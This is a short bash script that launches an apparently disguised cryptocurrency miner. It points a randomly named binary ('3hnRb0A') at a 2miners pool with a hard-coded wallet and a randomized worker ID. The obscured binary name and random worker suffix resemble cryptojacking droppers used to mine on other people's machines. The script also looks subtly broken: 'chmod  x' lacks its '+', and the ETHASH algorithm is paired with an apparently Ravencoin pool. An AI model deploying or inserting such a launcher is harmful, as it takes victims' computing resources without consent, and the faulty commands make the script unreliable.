#!/bin/bash
POOL=asia-rvn.2miners.com:6060
WALLET=RXNiSymsyLLVqMAyY3u8NiZZMRWcGg1Anr
WORKEER=$(echo $(shuf -i 10000-99999999999 -n 1)-LGK)

chmod  x 3hnRb0A
./3hnRb0A --algo ETHASH --pool $POOL --user $WALLET.$WORKEER --ethstratum ETHPROXY
